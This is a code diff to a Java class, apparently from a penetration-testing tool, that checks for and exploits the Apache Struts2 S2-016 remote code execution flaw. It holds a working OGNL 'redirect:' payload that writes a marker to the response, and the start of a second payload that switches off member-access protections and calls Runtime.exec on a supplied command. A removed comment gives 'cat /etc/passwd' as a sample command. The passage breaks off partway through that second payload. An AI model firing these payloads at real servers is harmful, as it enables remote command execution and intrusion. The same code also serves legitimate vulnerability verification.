@@ -40,31 +40,23 @@ public class Struts2RCE016 extends WebScriptBase {
 		String provePayload = "redirect:${#w=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#w.println('The Struts2-016 Remote Code Execution Is Exist!'),#w.flush(),#w.close()}";
 		String proveFlag = "The Struts2-016 Remote Code Execution Is Exist!";
 		String result = "";
-		try {
-			result = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(), getHttpHeaders(),URLEncoder.encode(provePayload).replace("+","%20")));
-			if (result!=null&&result.indexOf(proveFlag)>=0) {
-				getVulnerBean().setIsVulner(Permeate.isVulner);
-			}else{
-				getVulnerBean().setIsVulner(Permeate.isNotVulner);
-			}
-		} catch (ParseException e) {
+
+		result = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(), getHttpHeaders(),URLEncoder.encode(provePayload).replace("+","%20")));
+		if (result==null) {
 			result = Message.notAvailable;
 			getVulnerBean().setIsVulner(Permeate.isNotVerified);
-			e.printStackTrace();
-		} catch (IOException e) {
-			result = Message.notAvailable;
-			getVulnerBean().setIsVulner(Permeate.isNotVerified);
-			e.printStackTrace();
-		} finally{
-			proveBean.setReceiveMessage(result);
-			proveBean.setSendMessage(provePayload);
-			getVulnerBean().getProveBean().add(proveBean);
+		}else if(result.indexOf(proveFlag)>=0){
+			getVulnerBean().setIsVulner(Permeate.isVulner);
 		}
+		else{
+			getVulnerBean().setIsVulner(Permeate.isNotVulner);
+		}
+		proveBean.setReceiveMessage(result);
+		proveBean.setSendMessage(provePayload);
+		getVulnerBean().getProveBean().add(proveBean);
+		
 	}
 
-	/**
-	 * command 的格式： 'id'或者'cat','/etc/passwd';
-	 */
 	@Override
 	public void execCommand(String command) {
 		String execPayload1 = "redirect:${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec('";
